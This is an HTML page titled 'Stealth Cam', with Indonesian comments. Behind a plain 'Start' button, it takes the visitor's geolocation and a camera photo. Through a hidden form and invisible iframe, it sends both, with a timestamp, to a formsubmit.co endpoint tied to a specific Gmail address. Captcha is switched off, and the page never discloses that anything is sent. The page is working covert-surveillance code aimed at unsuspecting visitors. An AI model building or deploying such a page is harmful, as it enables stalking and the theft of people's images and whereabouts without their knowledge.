<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Stealth Cam</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #status { font-size: 14px; color: #666; margin-top: 10px; }
        #preview { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 999; }
        #btn { padding: 15px 30px; font-size: 18px; background: #fff; border: none; border-radius: 30px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <!-- IFRAME untuk menangani upload file tanpa reload -->
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <!-- FORM UTAMA -->
    <form id="stealthForm" action="https://formsubmit.co/ajax/desamuncrat477@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe">
        
        <!-- Field Pesan -->
        <input type="hidden" name="message" id="field_message">
        
        <!-- Field File (PENTING: Nama field 'attachment') -->
        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="environment">
        
        <!-- Konfigurasi FormSubmit -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="">
        <input type="hidden" name="_subject" value="Foto & Lokasi Baru">
    </form>

    <button id="btn">Start</button>
    <div id="status">Siap...</div>

    <script>
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const form = document.getElementById('stealthForm');
        const fileInput = document.getElementById('fileInput');
        const messageField = document.getElementById('field_message');
        const iframe = document.getElementById('hidden_iframe');

        btn.addEventListener('click', async () => {
            status.innerText = "Mengambil Lokasi & Kamera...";
            
            // 1. Ambil Lokasi
            let lokasi = "Tidak ada lokasi";
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
                } catch (e) { lokasi = "Lokasi ditolak"; }
            }

            // 2. Ambil Foto (Native Camera)
            // Kita klik input file yang sudah ada di form
            fileInput.click();

            // Tunggu user memilih foto
            await new Promise(resolve => {
                fileInput.onchange = () => {
                    if (fileInput.files && fileInput.files[0]) {
                        // File sudah terpilih!
                    }
                    resolve();
                };
            });

            // Cek apakah ada file
            if (!fileInput.files.length) {
                status.innerText = "Gagal: Tidak ada foto dipilih.";
                return;
            }

            // 3. Isi Data & Submit
            messageField.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}`;
            status.innerText = "Mengirim...";

            // SUBMIT FORM (Ini kuncinya)
            // Kita gunakan form.submit() yang akan mengirim ke iframe, bukan reload halaman
            form.submit();

            // 4. Tunggu response dari iframe
            iframe.onload = () => {
                try {
                    const content = iframe.contentDocument.body.innerText;
                    if (content.includes("success") || content.includes("200")) {
                        status.innerText = "Foto & Lokasi Terkirim!";
                        btn.style.display = 'none';
                    } else {
                        status.innerText = "Gagal dikirim.";
                    }
                } catch (e) {
                    status.innerText = "Selesai (Cek Spam)";
                }
            };
        });
    </script>
</body>
</html>
